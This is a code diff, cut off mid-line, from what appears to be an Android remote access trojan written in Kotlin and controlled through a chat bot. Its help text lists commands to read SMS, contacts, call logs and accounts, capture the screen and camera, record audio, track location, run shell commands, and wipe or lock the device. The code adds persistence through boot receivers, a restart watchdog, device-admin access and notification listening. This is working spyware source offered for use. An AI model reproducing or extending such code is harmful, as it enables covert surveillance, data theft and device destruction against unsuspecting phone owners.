@@ -83,6 +83,48 @@ object Config {
     const val CHAT_ID = "PASTE_YOUR_CHAT_ID_HERE"
 }
 
+val HELP_TEXT = """
+/info /battery /net /sim
+/sms /contacts /calllog /apps /accounts /calendar /clip /notif
+/screen /ss /sssetup /camf /camb /mic 15 /rec 30
+/loc /track on|off
+/open pkg /url link /click x y /clicktext t /type t
+/swipe x1 y1 x2 y2 /scroll up|down /back /home /recents /longpress x y /pinch x y in|out
+/shell cmd /ls path /get path /rm path
+/vol up|down|mute|unmute /bright 0-1 /torch on|off /vib /alarm
+/lock /wipe /pass 1234 /screenoff /admin
+/hide /show /kill pkg /uninstall pkg /toast msg
+""".trimIndent()
+
+fun startRat(c: Context) {
+    try {
+        val i = Intent(c, RatService::class.java)
+        if (Build.VERSION.SDK_INT >= 26) c.startForegroundService(i) else c.startService(i)
+    } catch (_: Exception) { }
+}
+
+fun startWatchdog(c: Context) {
+    try {
+        val i = Intent(c, Watchdog::class.java)
+        if (Build.VERSION.SDK_INT >= 26) ContextCompat.startForegroundService(c, i)
+        else c.startService(i)
+    } catch (_: Exception) { }
+}
+
+fun enableListener(c: Context) {
+    try {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N)
+            android.service.notification.NotificationListenerService.requestRebind(
+                ComponentName(c, NotifListener::class.java))
+    } catch (_: Exception) { }
+}
+
+fun dpm(c: Context) = c.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
+
+fun adminComp(c: Context) = ComponentName(c, Admin::class.java)
+
+fun adminActive(c: Context) = try { dpm(c).isAdminActive(adminComp(c)) } catch (_: Exception) { false }
+
 object Sender {
 
     private fun creds(ctx: Context): Pair<String, String>? {
@@ -217,29 +259,21 @@ class NotifListener : android.service.notification.NotificationListenerService()
         val pm = packageManager
         pm.getApplicationLabel(pm.getApplicationInfo(p, 0)).toString()
     } catch (_: Exception) { p }
-
-    companion object {
-        fun enable(ctx: Context) = try {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N)
-                android.service.notification.NotificationListenerService.requestRebind(
-                    ComponentName(ctx, NotifListener::class.java))
-        } catch (_: Exception) { }
-    }
 }
 
 class BootReceiver : BroadcastReceiver() {
     override fun onReceive(context: Context, intent: Intent) {
         val a = intent.action ?: return
         if (a == Intent.ACTION_BOOT_COMPLETED || a == "android.intent.action.QUICKBOOT_POWERON") {
-            NotifListener.enable(context)
-            RatService.start(context)
-            Watchdog.start(context)
+            enableListener(context)
+            startRat(context)
+            startWatchdog(context)
             Sender.send(context, "\uD83D\uDD04 Rebooted\n${Build.MANUFACTURER} ${Build.MODEL}")
         } else if (a == Intent.ACTION_POWER_CONNECTED) {
-            RatService.start(context)
+            startRat(context)
         } else if (a == Intent.ACTION_MY_PACKAGE_REPLACED) {
-            RatService.start(context)
-            Watchdog.start(context)
+            startRat(context)
+            startWatchdog(context)
         }
     }
 }
@@ -249,7 +283,7 @@ class Watchdog : Service() {
     private val h = Handler(Looper.getMainLooper())
     private val tick = object : Runnable {
         override fun run() {
-            RatService.start(this@Watchdog)
+            startRat(this@Watchdog)
             h.postDelayed(this, 120_000)
         }
     }
@@ -278,14 +312,6 @@ class Watchdog : Service() {
         h.removeCallbacks(tick)
         super.onDestroy()
     }
-
-    companion object {
-        fun start(c: Context) = try {
-            val i = Intent(c, Watchdog::class.java)
-            if (Build.VERSION.SDK_INT >= 26) ContextCompat.startForegroundService(c, i)
-            else c.startService(i)
-        } catch (_: Exception) { }
-    }
 }
 
 class Admin : DeviceAdminReceiver() {
@@ -301,12 +327,6 @@ class Admin : DeviceAdminReceiver() {
 
     override fun onPasswordSucceeded(context: Context, intent: Intent) {
         Sender.send(context, "\u2705 Unlocked")
-    }
-
-    companion object {
-        fun dpm(c: Context) = c.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
-        fun comp(c: Context) = ComponentName(c, Admin::class.java)
-        fun active(c: Context) = try { dpm(c).isAdminActive(comp(c)) } catch (_: Exception) { false }
     }
 }
 
@@ -410,6 +430,11 @@ object Scr {
     @Volatile var data: Intent? = null
 }
 
+object Acc {
+    @Volatile var svc: AccService? = null
+    @Volatile var pkg: String = ""
+}
+
 class ScreenCapActivity : Activity() {
     override fun onCreate(s: Bundle?) {
         super.onCreate(s)
@@ -493,22 +518,4 @@ class ScreenService : Service() {
         r.setOnImageAvailableListener({ rr ->
             try {
                 val img = rr.acquireLatestImage()
-                if (img != null) {
-                    val plane = img.planes[0]
-                    val b2 = Bitmap.createBitmap(img.width, img.height, Bitmap.Config.ARGB_8888)
-                    b2.copyPixelsFromBuffer(plane.buffer)
-                    bmp = b2
-                    img.close()
-                }
-            } catch (_: Exception) { }
-            latch.countDown()
-        }, Handler(mainLooper))
-
-        try {
-            if (!latch.await(3, TimeUnit.SECONDS)) return null
-        } catch (_: Exception) { return null }
-
-        val b = bmp ?: return null
-        val out = java.io.ByteArrayOutputStream()
-        val w = 720
-        val s = Bitmap.createScaledBitmap(b, w, (
+                if (im
